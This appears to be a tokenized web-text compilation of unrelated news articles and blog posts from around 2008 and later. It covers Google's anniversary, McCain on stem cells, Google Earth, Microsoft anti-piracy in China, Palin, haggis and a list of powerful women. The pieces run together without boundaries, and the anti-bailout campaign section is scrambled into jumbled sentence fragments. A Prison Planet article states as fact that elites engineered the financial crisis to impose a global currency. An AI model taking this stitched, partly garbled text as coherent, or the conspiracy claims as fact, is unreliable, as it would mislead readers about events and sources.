It ’s alive .
It changes with time and will be here as long as we want it .
Or if we leave and no one cares for it , it will someday revert back to the earth from which it came , to be just another one of natures reclaimed gardens .

Advertisement As Google prepares to celebrate its tenth anniversary the company has an eye on its future and declared that for web users " the best is yet to come " .
" Internet search has just gotten started , " Marissa Mayer , Google 's head of search products , told the BBC .
" The best search engine would be your friend , with a photographic memory about you and know what you know .
" It would have access to the world of information and retrieve facts from anywhere in the context of what you know already . "
Cloud computing
While employee number 22 admits that gazing into the future is an imprecise science akin to asking " Newton to predict Einstein " , Ms Mayer said the one thing she does know is that the next 10 years for Google " are going to be really exciting with big advances in the world of search .

" We are still making big breakthroughs and if you think about putting pictures and video into search , then search just gets better . "
Ms Mayer told the BBC that she foresees cloud computing playing an important role in the lives of people in the next decade .
Perhaps unsurprisingly it features high on Google 's strategy map going into the next decade .
As its name implies cloud computing involves users storing data on the net and getting at it and the services they want anytime and anywhere thanks to ubiquitous high - speed networks .
" There is a real vision and real story developing around cloud computing and what it means in terms of how people should use their computers , " said Ms Mayer .
" We see the cloud as an amazing tool for everyone . "
Do n't be evil
It was 10 years ago this month that Larry Page and Sergey Brin formed Google Inc to " organise all the world 's information and make it universally accessible and useful " and do it better than anyone else .

Media requires JavaScript to play .
Today it controls around 40 % of online advertising as well as 70 % of search .
Its suite of products is ever expanding and this week it launched its own internet browser called Chrome to compete with Microsoft 's Internet Explorer and Mozilla 's Firefox .
Google 's code of conduct says " Do n't be evil " but some fear its motives as it gathers extraordinary amounts of information on users habits , likes and dislikes .
" Google is an incredible success story and has become the central nervous system for our digitally dependent lives but there is a price to pay for that , " said Jeff Chester , executive director of the respected Centre for Digital Democracy .
" Google is not alone in invisibly structuring its operations so it can collect more and more information and data about all of us and deliver our online behaviour to a growing list of advertisers and fatten the Google bank account . "
Industry watchers maintain that in the last couple of years the tide has turned against Google which is " no longer taken for granted to be the good guy . "
For $ 1700 a month , this garage was Google 's first official office " To start with Google could n't make any mistakes and was the favourite of everybody , " said Laurent Lachal , an analyst at research firm Ovum .
" Recently there has been a backlash with an element of paranoia developing against Google with some saying they are as evil as Microsoft .
" The world is no longer at Google 's feet and looking at the launch of Chrome there was a real deep scrutiny of the product and Google 's motives which resulted in a change to the wording of its end user licence , " he said .
Brainy people Despite a change in attitude towards the company , Fortune Magazine reports that it tops polls of the most desired place to work .
The firm is inundated with applications from people eager to sign up as a potential Googler .
It is famed for its free lunches and dinners , onsite massages and softball games , but none of this is what persuaded Biz Stone to go and work at the famed Googleplex in 2003 to run the Blogger service that Google had bought .
He told the BBC : " I was attracted to the idea of working with a bunch of smart interesting people even though it meant moving from Boston to California and getting a new group of friends .
It felt like a real adventure . "
HAVE YOUR SAY I first used Google in ' 98 or ' 99 for school work .
I never thought it would be anything like it is today Ian M , Virginia , USA Mr Stone left after two years for another start up which eventually resulted in the founding of micro blogging service Twitter .
He left too early to turn his potentially lucrative share options into cash .
" I had to give up the riches to move but it was a choice between a long and comfortable existence or taking the opportunity to take some chances in life .
" Google was a great place to work because it was so brainy and it was like being at a college campus , " he said .
" Friends speak in alarming tones about Google having all this information about us , but I 'm not worried because people are getting more and more open anyway and sharing their history , their photos , their opinions online more and more . "
Future success Google 's rise to the top and its ability to maintain that position for so long is what analyst Laurent Lachal described as " no mean feat . "
But as it goes into its next decade with an eye to search and the world of cloud computing , he sees the world of enterprise as vital as the company goes forward .
" Enterprise is crucial to the future success of the company because most of the applications and services they provide are used by the consumer market and not the enterprise market which represents millions in untapped potential . "
Employee no 22 misses the good old days of long hours and canteen food For Jeff Chester , privacy and security are dual issues , not just for Google , but for the industry as a whole .
" Google will be a digital king maker and it is possible the way it uses the information it has about us all might result in a privacy nightmare as it partners with business to monetise everything they do . "
In response Ms Mayer said that " everyday we strive to be the best and earn the trust of the user " .
But even amid all this sober assessment of Google 's last ten years , Ms Mayer remembers the good old days of 120 hour weeks , fantastic cafeteria food and being interviewed while sitting at a ping pong table that doubled as a conference table .
" There was also a giant wall of beer at one end of the office , " she said of her interview that took place in April in the late 1990's .
" I was worried that I was coming to work at a hard drinking company but I was assured that this was beer that was left over from the Christmas party and that no one really drank that much . "
This gives a flavour of how Google plans to celebrate its tenth anniversary .
There will be no massive party or fanfare just offices doing their own thing - such as staging 10 k charity runs .
For most Googlers it will be just be business as usual .

As President , John McCain would reverse President Bush 's moratorium on federal funding for embryonic stem cell research .
The Republican presidential nominee answered a lengthy science questionnaire from a group called Science Debate 2008 .
The group released the candidate 's answers Monday .
Photo : Associated Press / John Raoux
John McCain reaffirmed his support for federal funding of embryonic stem cell research on Monday – in direct opposition to his party 's agreed - upon official policy on the matter .
" While I support federal funding for embryonic stem cell research , I believe clear lines should be drawn that reflect a refusal to sacrifice moral values and ethical principles for the sake of scientific progress , " McCain wrote in a response to a questionnaire released Monday by Science Debate 2008 , a broad coalition of scientists and engineers .
The Republican party platform , adopted during its convention earlier this month , opposes embryonic stem cell research , preferring scientists to work with stem cells derived from other sources .
" We call for a major expansion of support for the stem cell research that now shows amazing promise and offers the greatest hope for scores of diseases — with adult stem cells , umbilical cord blood and cells reprogrammed into pluripotent stem cells — without the destruction of embryonic human life , " reads the policy statement within the published Republican party platform .
" We call for a ban on human cloning and a ban on the creation of or experimentation on human embryos for research purposes . "
McCain 's position also stands in stark contrast to his vice presidential pick Sarah Palin 's personal opinion .
She said as recently as Friday during her interview with ABC News ' anchor Charlie
Gibson that she 's personally opposed to embryonic stem cell research – even as the McCain - Palin campaign aired radio spots touting the campaign 's support for stem cell research as a promising avenue to help find cures for common ailments .
The ad did not specify what kind of stem cell research that the politicians support .
Nor did the campaign specify where the ad ran .
McCain 's answer on stem cells was one of 14 in a thorough 11 - page primer on science policy that covered ' innovation , ' climate change , energy , education , national security , pandemics and biosecurity , genetics research , water , the health of the oceans , scientific integrity , health and space exploration .
President Bush in 2001 banned federal funding for starting new lines of embryonic stem cells for research purposes .
" ( McCain's ) always said he supports funding for embryonic stem cell research , but he 's historically also sponsored anti-science legislation that would have banned certain scientific techniques , " said Sean Tipton , director of public affairs for the American Society for Reproductive Medicine .
Tipton pointed specifically to legislation that McCain has sponsored with Sen. Sam Brownback , R - Kansas .
( It never made it out of Congress . )
" The approach McCain took was to ban moving a nucleus from one cell to another , a technique that obviously has many , many other applications , other than cloning , " Tipton said .
Current research still relies on stem cells derived from fertilized eggs for very specific purposes for which no other kinds will do , he added .
McCain did stress his hope that recent breakthroughs in this area of science would render the political debate over the issue " academic . "
" I also support funding for other research programs , including amniotic fluid and adult stem cell research which hold much scientific promise and do not involve the use of embryos , " reads his response to the coalition 's questions .
While McCain 's responses often were n't as detailed as his
Democratic counterpart's , which were released last week by the group , they offered a few more details on his world view in the world of science .
For example , McCain did not promise to double federal funding for basic research in the next 10 years as Barack Obama did .
But he did promise to restore " credibility " and " the role of the Office of Science and
Technology Policy within the White House structure . "
President Bush 's administration has repeatedly come under fire in the past eight years for stifling the results of scientific research that clashed with the administration 's policies .
" I will work to fill early in my administration both the position of science adviser and at least four assistant directors within the
OSTP , " McCain said .
McCain also used the opportunity to justify positions that were n't likely to be popular with the scientific community .
For example , while he touts the benefits of alternative energy , he 's voted against tax credits to encourage investment in the sector .
About $ 500 million worth of tax credits for investment and production in alternative energy sources such as solar and wind power are scheduled to expire at the end of December if Congress does n't act to extend them .
McCain tells the Science Debate 2008 organizers that he's for renewable energy as well as nuclear power , but nevertheless , " I 've voted against the current patchwork of tax credits for renewable power because they were temporary , and often the result of who had the best lobbyist instead of who had the best ideas . "
Instead , he says he wants to reform the effort " so that it is fair , rational and permanent , letting the market decide which ideas can move us toward clean and renewable energy . "
McCain also defended his desire to continue to send humans into space .
He says that he is committed to making sure that the
United States remains a world leader in the field of space exploration .
" Although the general view in the research community is that human exploration is not an efficient way to increase scientific discoveries given the expense and logistical limitations , the role of manned space flight goes well beyond the issue of scientific discovery and is a reflection of national power and pride , " he writes .
*__Update : __Rick Weiss , a senior fellow at the left - leaning think - tank Center for American Progress , writes in to note that " It is too glib to say McCain is supportive and is bucking his party . "
He and University of Pennsylvania bioethics professor Jonathan Moreno ask in this Boston Globe op - edpiece : " [ W ] ho's in charge of Republican policy on this important question , and what exactly would the policy on stem cell research be in a McCain presidency ? "
It 's a thought - provoking read .
This article has been modified to clarify that President Bush did not issue an executive order in 2001 , but simply made a policy announcement .

Earth Day has been celebrated last week and it seems that the big search engine company has celebrated it by releasing a new major update for its Google Earth application .
The new Google Earth version 9 has been designed to run in Chrome web browser , by accessing this Google Earth web page .
At the same time , the Google Earth app for Android OS has been updated , while the iOS version of it will be updated sometime in the next days .
On the new Google Earth version , the developers have focused on guided tours via the “ Voyager ” section .
This allows you to jump into Street View , YouTube videos , 360° content and Google Earth landmarks .
Keep in mind that the tours are led by documentarians and scientists , and some of the content has been produced by groups such as BBC ’s Planet Earth team .
Google Earth also comes with a “ Sesame Street muppet ” section , which has been designed for kids .
According to Engadget , there are currently 40 stories in this section and the developers keep updating it with new stories .
You will also notice an “ I ’m Feeling Lucky ” button , which will take you to a random point on Earth and show you a “ Knowledge card ” with some information from Wikipedia about that specific place .
Unfortunately , the Google Earth and Google Earth Pro for Windows PC have not been updated yet , meaning that it is still missing many options and features .
However , we ’re pretty sure that the developers are already working on it and that they will finally release the Google Earth and Google Earth Pro version 9 for the desktop platform .
Have you tested the Google Earth on Chrome browser or Android OS ?
Tell us your thoughts about the new features and options that it comes with !
A French blog has posted what it purports to be a leaked photo of the new MacBook Pro .
NowhereElsecame across the photo , and it 's pretty darn interesting .
It 's got what appears to be a reflection on the trackpad that displays the OS X dock .
Could it be that they 're implementing a touchscreen in the trackpad ?
That would be pretty cool – although it sounds expensive , so perhaps it'd be the top - of - the - line MacBook Pro ?
Also , you 'll notice the hinge used to open the current MacBook Pros is no longer there .
As for the screen , you 'll notice it appears to be contained in a black enclosure – similar to the other rumored MacBook Pro photo that appeared about a week ago ( to the right ) .
( Sigh ) .
Why do leaked photos always have to look grainy as hell ?
What do you think , Gadget Lab readers ?

Brown , Sarkozy , ECB push new world economic order
Paul Joseph Watson & Kurt Nimmo
Prison Planet
Monday , October 20 , 2008
The swift and ruthless exploitation of the economic meltdown on behalf of globalists and central banks revolves around their drive to move towards a one world currency system and an unprecedented centralization of global financial power .
Statements on behalf of world leaders and central banks over the past two weeks have made it clear that the agenda to further collate economic power and control of currencies into the hands of the few is rapidly accelerating – all in the name of solving a financial crisis that was caused as a result of the same fiat money system that the elite themselves created and maintained .
The original Bretton Woods agreement in 1944 , spurred by the depression of the 1930s and the second world war , created the International Monetary Fund , the World Bank and laid down common standards for markets around the world .
Now with the current financial crisis EU leaders see another opportunity to impose global regulations on sovereign economies .
As the crisis reached its peak at the end of September , British Prime Minister Gordon Brown led the call for “ a new global financial order ” in which the world financial system would be built around a centrally coordinated policy of international regulation .
( ARTICLE CONTINUES BELOW )
A d v e r t i s e m e n t
Morgan Stanley Chief Executive John
Mack has also called for a new global body to oversee the financial crisis , warning that it is like nothing he ’s ever seen before .
The sentiment echoes those of elite figures such as CFR member Jeffrey Garten and Timothy Geithner , president of the Federal Reserve Bank of New York , who have both recently called for a “ new global monetary authority ” , a de- facto global financial dictatorship , operating across borders and forcing nations and corporations to register and adhere to strict monitoring and regulations .
European Central Bank council member Ewald Nowotny told Bloomberg yesterday that the centrality of the U.S. dollar was in question and that a “ tri-polar ” global currency system is in development between the U.S. , Asia and Europe to replace it .
This followed a call by French President to question whether a “ worldwide currency system ” should be introduced in response to the financial crisis .
“ Another subject in tomorrow ’s world is that of the great currencies .
How many should there be ?
What should the agreement between these great currencies be ?
Should we organize a discussion ?
Should a country like India one day have a global currency ? ”
Sarkozy told a news conference , reports Reuters .
Any discussion would be purely academic , as the ruling elite long ago decided to force a global currency down our throats .
In fact , a global currency is at the very core of their plan to dominate the world .
Control money and you control the destiny of states , you eliminate national sovereignty .
“ The control of money and credit strikes at the very heart of national sovereignty , ” A.W. Clausen , president of Bank of America once observed .
As Georgetown professor and CFR historian Carroll Quigley noted , the goal of the banking families and their minions consists of “ nothing less than to create a world system of financial control in private hands able to dominate the political system of each country and the economy of the world as a whole … controlled in a feudalist fashion by the central banks of the world acting in concert , by secret agreements arrived at in frequent private meetings and conferences . ”
It remains to be seen if the EU will realize its “ solution ” to the world economic crisis .
In 2007 , Robert Mundell , “ the father of the euro , ” noted that “ international monetary reform usually becomes possible only in response to a felt need and the threat of a global crisis . ”
Certainly , the elite cooked up an appropriate global crisis , now they will engage in a full court press to establish a global currency and eventually a global government .

Comment on this article
We economists have a scenario that we call " current policy plus Bush tax cuts . "
It is made up of ( i ) the laws currently in force in the United States of America , plus ( ii ) the assumption that the defense , veterans , and other spending currently appropriated year - by - year by the congress remains the same as a share of GDP , plus ( iii ) the assumption that the tax breaks like the R&D credit and the regular pruning - back of the Alternative Minimum Tax that are voted for year by year by overwhelming congressional majorities continue to be enacted year - by - year , plus ( iv ) the assumption that the tax cuts George W. Bush proposed in 2001 and 2003 but made time - limited and set to expire early next decade are renewed .
This " current policy plus Bush tax cuts " scenario has the federal government taxing about 20 % of GDP over the next seventy - five years .
It has the federal government forecast to spend 28 % of GDP on average over the next seventy - five years .
This is the fiscal gap .
A number of policies could be enacted to eliminate this fiscal gap .
Simply doing nothing and letting the Bush tax cuts expire as current law requires them to do would reduce the fiscal gap from 8 percent to 6 percent of GDP .
Raising Social Security taxes or cutting back future Social Security benefits by the about 1/7 needed to get the Social Security system back into projected 75 - year balance would further reduce the fiscal gap from 6 percent of GDP to 5 percent of GDP .
Returning military spending to its late - 1990s share of GDP - - not fighting wars in Iraq , et cetera -- would reduce the fiscal gap from 5 % to 3.5 % of GDP .
And eliminating " excess " cost growth in the government health care programs Medicare and Medicaid -- allowing Medicare and Medicaid spending per eligible beneficiary to grow only as fast as the rate of growth of income in the economy as a whole -- would bring the federal government into projected balance .
I believe that when we Americans look deep into ourselves and ask us what we want our government -- because it is our government : it is our agent to do what we want with our money just as the guy in Florida we hire to keep grandma's one bedroom condo in repair is our agent -- to do , we conclude the following :
We want to let the Bush tax cuts expire .
We want to close the 75 - year Social Security gap , half by raising the limit on earnings taxed by Social Security so that the upper middle class and the rich pay more for Social Security and half by reducing the rate of growth of benefits at retirement .
We want to stop sending our soldiers -- the best - trained and best - equipped high tech armed forces in the world - - abroad to be military police in countries riven by sectarian conflict where they do not speak the language -- and so return defense spending to its late - 1990s share of GDP .
We want to reduce but not eliminate the " excess " cost growth in Medicare and Medicaid : we believe our doctors , nurses , and druggists will learn how to do wonderful things over the next two generations , and we do not want those wonderful things in the way of medicine applied only to the rich but to the poor and old as well .
Whether or not we decide to do ( 1 ) through ( 4 ) above , we want to raise taxes to cover whatever of the long - run fiscal gap remains , and so bring the federal budget back into balance over the long run .
Note that ( 5 ) is not optional .
As the late Milton Friedman liked to put it : to spend is to tax .
If the government buys things , it must get the money to buy them from somewhere .
It can get the money from three places .
It can tax .
It can borrow - - but then the borrowing has to be repaid with interest , and the more is borrowed the higher the interest and the worse the value the taxpayers ultimately get for their money when they are taxed to repay the borrowing .
Or it can print the money and so inflate the currency -- but that too is a tax , and an especially unfair , painful , and destructive one , as lots and lots of people victimized by inflation find their wealth does n't buy what it used to and what they expected .
We can argue over whether ( 1 ) through ( 4 ) is what we want to do -- that is what politics is about .
But whatever we decide to do with ( 1 ) through ( 4 ) , ( 5 ) is not optional - - not , that is , if we want to continue to have a rich country in the long run .
And the politicians who have told you that ( 5 ) is optional from Ronald Reagan to George H.W. Bush to Robert Dole to George W. Bush and now John McCain are not your friends , or America 's friends .

Chinese internet users have reacted with fury after Microsoft launched an anti-piracy tool to combat the widespread sale of fake software .
People have flooded blogs and bulletin boards to complain it violates their right to privacy - with one lawyer even reporting the firm to security officials for " hacking " .
Microsoft dominates the Chinese market and even the president , Hu Jintao , has said he uses its products .
But with software piracy as a whole said to stand at over 90 % , the firm 's profits fail to reflect its popularity .
The new version of its Windows Genuine Advantage anti-piracy programme turns the on - screen background black every hour if the installed software fails a validation test .
Previous versions simply notified users their product was counterfeit .
But the software giant 's attempt to protect its intellectual property sparked angry denunciations .
" The computer is mine ! " one angry blogger wrote on the popular Chinese web portal Sina.com .
" Microsoft has no right to control my hardware without my agreement . "
Dong Zhengwei , 35 , a Beijing lawyer , has complained to the public security ministry , describing the software giant as the " biggest hacker in China , with its intrusion into users ' computer systems without their agreement or any judicial authority " .
He told the official China Daily newspaper that he believed the measure breached China 's criminal law , adding : " I respect the right of Microsoft to protect its intellectual property , but it is taking on the wrong target with wrong measures .
They should target producers and sellers of fake software , not users . "
The China Software Industry Association said it also planned to take action against Microsoft , with director Chen Chong telling China Daily that the measure was " very bad " .
Critics said Microsoft was putting their information at risk by accessing their computers .
Microsoft says that it collects minimal information .
It argues that counterfeit software poses a far greater risk to information security and says that it is helping users who may not be aware that they are using a fake product - and who risk problems such as data corruption or even identity theft .
Yesterday the company claimed that software piracy was costing the United States tens of thousands of jobs and billions of dollars .
Here are a few thoughts on the economics of apparent police brutality and media portrayals thereof :
1. Judiciously edited video can be deceptive .
However , I ’d be interested in learning the conditions under which a woman being cross-checked by a cop who looks to be about a head taller than her and probably 50 - 100 pounds heavier — I ’m not very good at eyeballing these kinds of things — is warranted .
Perhaps it ’s a credible commitment to take no prisoners as a means of defusing an explosive situation , but I ’m skeptical .
The fact that the cops “ disappeared ” her ( even if only temporarily ) while she was giving an interview was a little bit alarming .
2 . As stories like these develop , I predict that they will be cast as struggles between the state and individual rights as recognized under the first amendment .
This interpretation has some merit , but the key problem rests fundamentally on questions of poorly - defined property rights .
In the second video , this is stated explicitly : the news team was “ on public property . ”
Of course , when “ the public ” owns something , nobody does — which means that the right to exclude others from use is poorly defined .
Common property is a source of conflict .
It is clear that I do n’t have the right to enter your living room and say what I want under the guise of free speech or to observe what you ’re reading or watching on TV and report on it under the guise of a free press .
When resources are unowned , our claims come into unavoidable conflict .
Conflict is a necessary consequence of poorly defined ownership .
3. Monopolists behave like monopolists .
Competition is a civilizing force : if I do n’t like the service your company provides , I can take my business elsewhere .
This is only true in a limited sense in the case of defense and police protection .
The case for government provision of police services rests on a standard story about externalities .
If I subscribe to police services , my neighbors enjoy a benefit for which they do not have to pay because criminals will presumably be less likely to go about their business in our neighborhood .
At the same time , though , government provision changes the incentives : insulation from competition means that income is not tied to ability to create value .
The creative competitive pressures of the marketplace are replaced by the noisier ( and in some cases , destructive ) competitive pressures of the political sphere .
The structure of incentives lends itself to corruption and inefficiency .
Criticisms of the incentives inherent in government provision of services are sometimes unfortunately interpreted as personal attacks against the people providing the services .
Nothing above is not to denigrate people who put on a police uniforms because of the actions of a few bad apples .
My own experience with the police has been largely positive : many cops are outstanding human beings who are dedicated to their jobs .
One of my friends from high school is the quintessential “ good cop , “ the officers who took the police report after our house was robbed did a commendable job , and the campus safety officers here at Rhodes are outstanding .
However , provision of police services often relies on people to do what is right for its own sake irrespective of the incentives created by the system .
In a fallen world , relying on individual virtue rather than the clearly - defined incentives that emerge in a market economy is a recipe for waste , abuse , and inefficiency .

Phelps Owns The World
Okay , so it ’s not exactly green news , but I just had to give a shout out to Michael Phelps , the all time , leading Olympian in the history of the world , ever .
That ’s a pretty sweet title if you ask me .
To honor Phelps , I ’ve made a little picture of how he feels :
Congrats Michael Phelps , you really are the man !
Are You Tired of Being Ripped Off By Congress and the White House ?
Is this Wall Street Bailout the Last Straw for You ?
The public won the first round !
But last Friday they went and passed
the same ripoff
Do n't let up the pressure !
Year after year , election after election ,
We can do this !
First : Vote against any incumbent
Second : Vote for the incumbent 's major opponent .
If the challenger stands for things you do n't like ,
Pennsylvania residents have shown the way .
The citizenry rose up
If Pennsylvania voters
If you are fed up
any member of your congressional delegation , whatever the party
Now ( and this is critical ! ) send
www.throwthemallout.synthasite.com
And talk to everyone you know
We have been passive too long !
We the People bombarded Congress with calls and emails , actually crashing the Capital website and jamming up the phone system , with " No ! " opinions outnumbering backers of a bailout by 999:1.handout of $ 700 billion to the Wall Street gang in the Senate .
We know who has voted to bankroll Wall Street with taxpayer money .
Now the time for phone calls and emails to Congress are past .
It 's time to start calling friends and neighbors , to get them to vote against any incumbent who voted for this outrage .
we voters of this nation have returned to office representatives and senators who then betray us and act in the interests of big corporate interests , but perhaps never has this betrayal been so obvious .
Maybe this time we can make them pay , and elect a Congress that will be composed of our representatives for a change .
The key is to do two things : who voted for the bailout .
It does n't matter whatever good things they 've done in your opinion .
This is the one and only issue .
This time it wo n't work if you just vote for a Third Party protest candidate .
The point is not to register a protest ; it is to oust the incumbent , and the only way to do that is to support the opponent who really has a chance to do that .
do n't worry about it .
You can deal with that later .
The important thing is to let every member of Congress know that if you betray the public trust , you 're history .
We learned that the the state legislature -- Republicans and Democrats -- had connived in the middle of the night to give themselves a raise in violation of the state constitution , which said raises could only be given to the next cycle of elected officials , not to those in a current term .
They got around this bar to self - dealing by declaring the pay increases " undocumented expense reimbursements . " and in a leaderless grassroots campaign , they swept out off office many long - time members of the legislature who had voted for the measure , as well as a judge who backed the action ( the state 's judges get whatever the legislators get ) ! can do this , so can the rest of America . with having your money ( and your kids ' money , and their kids ' money ! ) stolen and handed to the greedy , crooked bankers , insurance executives and auto tycoons who have been destroying jobs and undermining the US economy for years while enriching themselves at our expense , then make a pledge to yourself to vote against , who votes for this latest colossal $ 700 - billion Wall Street bailout !
this website address : to everyone you know .
and get them to join this viral campaign to clean out the Capitol of the thieves and corporate whores who are wrecking the country .

She did n’t visit Ireland , which is what the McCain - Palin campaign claimed to Politico ’s Ben Smith on Saturday .
She had a short refueling stopover , which means at best her extensive Irish diplomacy amounted to buying a sweater and a beer mug in the Shannon airport .
Why does Sarah Palin ’s duty - free - diplomacy matter ?
Because John McCain , who is 72 and has had 4 bouts of cancer , just picked Sarah Palin to replace him as commander in chief should he die or be incapacitated in office .
Sarah Palin , in an effort to bolster her non-existent national security expertise , claimed she had visited 3 countries : Germany ; Kuwait ; and Ireland .
Now we find out that one of those three , 33 % of her experience , was pretty much a lie .
Did the McCain campaign know that Palin basically lied to the media and the American people ?
Or did this Irish blogger do the vetting that the McCain campaign could n’t be bothered to do ?
Oh , the McCain - Palin campaign now alleges that Palin visited Canada too .
Sure , if you count buying a Celine Dion CD .
Yes , haggis — minced sheep organs mixed with onions , oatmeal , and spices , and then boiled inside the sheep ’s stomach — could be the latest victim of global warming .
A vital ingredient to make the traditional Scottish dish is becoming increasingly hard to find : sheep lung .
Many sheep have been infected with Lung Worm , which does not affect the rest of the sheep ’s body , does render the lungs inedible .[ social_buttons ]
“ Lung worm has been at a very low level and did not cause serious problems in sheep but with the changing climate and availability of the parasite it is becoming a problem , ” said Sandy Clark , a veterinarian at the Scottish Agricultural College in Thurso .
But haggis fans need - not worry .
Scottish butchers are sourcing their sheep lungs from Irish farms instead , where Lung Worm has not been a problem .
However , acquiring the lungs from farther away certainly will not help stop climate change , the root of the spread , according to Clark .
Actually , a bigger source of the problem is the meat itself .
For those who want to eat haggis and have their planet too , vegetarian versions are easy to prepare and even available canned and ready to serve .

The pages of history are littered with the names of powerful men .
But from time to time , there have been women who have shone out as being equally powerful as the men in their time – some of whom have even gone on to shape the future of the world as we know it .
This is a list of ten of those incredibly powerful women .
10 Eleanor of Aquitaine born : 1122 ? ; died : 1204
Eleanor was one of the wealthiest and most powerful women in Europe and the world during the High Middle Ages .
Eleanor inherited the Duchy of Aquitaine and Poitiers after her father ’s death when she was only 15 .
As a result , Eleanor became an independent ruler in her own right receiving the titles of Duchess of Aquitaine and Countess of Poitiers .
Aquitaine was the largest and wealthiest province of France during the 12th century .
Unlike many other monarchs and women of the Middle Ages , Eleanor and her family were very well educated .
Eleanor is credited for having transformed Aquitaine into one of the largest intellectual and cultural centers in Medieval Western Europe .
Eleanor became Queen Consort to Louis VII of France in 1137 .
During her marriage to Louis , she participated in the Second Crusade in 1147 and even traveled with her husband to the Byzantine Empire .
Eleanor became a key figure in developing trade agreements between Western Europe , Constantinople , and the Holy Land .
She eventually had the marriage to Louis annulled in 1152 and in 1154 , Eleanor became Queen Consort to Henry II of England .
In 1170 , Thomas Becket , the Archbishop of Canterbury , was assassinated for going against King Henry II .
Eleanor , among many others , strongly opposed the assassination .
This eventually led to the Revolt of 1173 - 1174 in which Eleanor , three of her sons , and rebel supporters sided against Henry .
The revolt failed , however , and Eleanor was imprisoned for sixteen years .
9 Hatshepsut born : 1508 BC ? ; died : 1458 BC
Hatshepsut was one of the most powerful women in the ancient world .
She was the fifth pharaoh of the Eighteenth Dynasty of Ancient Egypt and she ruled longer than any other woman in Egyptian history .
Hatshepsut was married to her sickly half brother , Thutmose II , and the two of them began to co-rule after the death of their father , Thutmose I , in 1492 BC In 1479 BC , Thutmose II died and Hatshepsut continued to rule by herself until her own death in 1458 BC
It is believed by many Egyptologists and historians that Hatshepsut was one of Ancient Egypt ’s most successful monarchs .
She commissioned many building projects and reestablished trade networks that had been disrupted by the Hyksos invaders of the Second Intermediate Period .
Hatshepsut also led a large - scale expedition to the Land of Punt , a wealthy and sophisticated country to the south of Egypt .
Hatshepsut is also believed to have led successful military campaigns in Nubia , the Levant , and Syria during her reign .
8 Maria Theresa of Austria born : 1717 ; died : 1780
Maria Theresa succeeded her father , Holy Roman Emperor Charles VI , as empress of the Hapsburg controlled lands of Central Europe in 1740 .
She made her son , Joseph II , coregent in 1765 after the death of her husband .
In the same year Maria Theresa came to power , Fredrick II of Brandenburg - Prussia initiated the War of Austrian Succession by invading the Hapsburg province of Silesia .
Fredrick refused to recognize Maria Theresa as the rightful heir to the throne .
He rallied other nations such as Bavaria , Saxony , France , and Spain to side with him and contribute to the conflict .
Maria Theresa retaliated by rallying Hungarian arms to her defense .
As a result , she was able to repel the invading armies and preserve the Hapsburg state as a major European power .
The war officially ended in 1748 with the signing of the Treaty of Aix - la - Chapelle .
Maria
Theresa brought about many economic and political changes to her empire .
She increased the size of the army by 200 percent and increased taxes in order to guarantee a steady income for the government , and in particular for the military .
She centralized the government by combining the Austrian and Bohemian chancellaries , formerly separate , into one administrative office .
She also started what became known as the Diplomatic Revolution in 1756 when she created an alliance with France , a former enemy , to serve as a coalition against the newly allied Prussia and Great Britain .
Her reforms and political decisions were successful in strengthening the economy and the state in general .
Maria Theresa was also a participant in the Enlightenment .
She strongly promoted education and liberal politics .
She founded Imperial and Royal Academy of Science and Literature in Brussels and she supported medical research by demanding that the University of Vienna be given money to make the medical faculty more efficient .
Some of Maria Theresa ’s civil reforms included the abolition of witch - burning and torture , getting rid of capital punishment , and making education mandatory .
7 Empress Theodora born : 500 AD ? ; died : 548 AD
Empress Theodora was one of the most influential and powerful women in the Early Middle Ages .
She was the wife of Emperor Justinian I and joint ruler of the Byzantine Empire .
Prior to her marriage to Justinian , Theodora had been an actress and she entertained at banquets for nobles .
She also became a courtesan to many of the nobles she entertained .
She later converted to Monophysite Christianity and gave up her former lifestyle .
She married Justinian in either 523 AD or 525 AD and following the death of Emperor Justin I in 527 AD , both Justinian I and Theodora took control of the empire .
Many decisions concerning the government were made by Theodora .
For example , 532 AD , resentment over high taxes , religious controversy , and political corruption led to the Nika riot in Constantinople .
Fearing for his life , Justinian , tried to flee the city .
Theodora intervened and was able to convince her husband to stay .
With Theodora ’s support , Justinian was able to successfully crush the revolt .
Theodora participated in making Constantinople one of the world ’s most sophisticated cities and promoting women ’s rights .
She had bridges , aqueducts , and churches built .
One such building , the Hagia Sophia , built between 532 AD and 537 AD , is considered one of the greatest examples of Byzantine architecture .
She had laws passed that prohibited forced prostitution and closed brothels .
Theodora also gave women more rights in divorce and property ownership .
She gave mothers guardianship of their children , instilled a death penalty for rape , and forbade the killing of a wife who committed adultery .
Theodora died from cancer on June 28 , 548 AD She and Justinian are both considered saints by the East Orthodox Church .
6 Empress Wu Zetian born : 625 AD ; died : 705 AD
Empress Wu Zetian is considered to be one of the most powerful women in Chinese history .
She lived during the Tang Dynasty and was born to a wealthy and noble family .
She was also very well educated .
When Wu Zetian was 13 , she was sent to Emperor Taizong ’s court to be one of his concubines .
After Emperor Taizong ’s death in 649 AD , Emperor Gaozong came to power and Wu Zetian was sent off to become a Buddhist nun .
Empress Wang , Gaozong ’s wife , had come into a power struggle with one of his favorite concubines , Consort Xiao .
In order to distract Gaozong ’s attention from Consort Xiao , Empress Wang brought Wu Zetian back to the palace to become another concubine to her husband .
This plan , however , backfired on Empress Wang .
Wu Zetian eventually became one of Gaozong ’s favorites and the power struggle between the three women : Wu Zetian , Empress Wang , and Consort Xiao intensified .
Empress Wang and Consort Xiao , former rivals , eventually decided to join forces in order to stop Wu Zetian ’s influence over Gaozong .
This plan backfired too because in 654 AD , Wu Zetian gave birth to a daughter and her daughter died shortly after .
Gaozong and court officials accused Empress Wang of killing the infant .
As a result , Gaozong replaced Wu Zetian as his empress .
In 655 AD , both Consort Xiao and former Empress Wang were accused of witchcraft and they were both executed on Empress Wu Zetian ’s orders .
As empress , Wu Zetian became extremely powerful .
Toward the end of Gaozong ’s life , she was making virtually all of the major decisions that affected the government .
Emperor Gaozong eventually died in 683 AD and Wu Zetian became empress dowager .
In 690 AD , Wu Zetian crowned herself Emperor of China and she interrupted the Tang Dynasty by creating her own ; the Zhou Dynasty .
Wu Zetian is the only woman in Chinese history to rule as emperor .
Despite her ruthlessness to gain power and having many noblemen and noblewomen killed or exiled in the process , Wu Zetian accomplished many things when she was in power .
She influenced the spread of Buddhism in China and eventually made it the official religion ; replacing Taoism .
She was also successful in lowering high taxes and increasing agricultural production .
The Empress died in 705 AD at the age of 80 .
5 Isabella I of Castile born : 1451 ; died : 1504
Isabella I is considered to be one of the most powerful , yet controversial , queens in Spanish history .
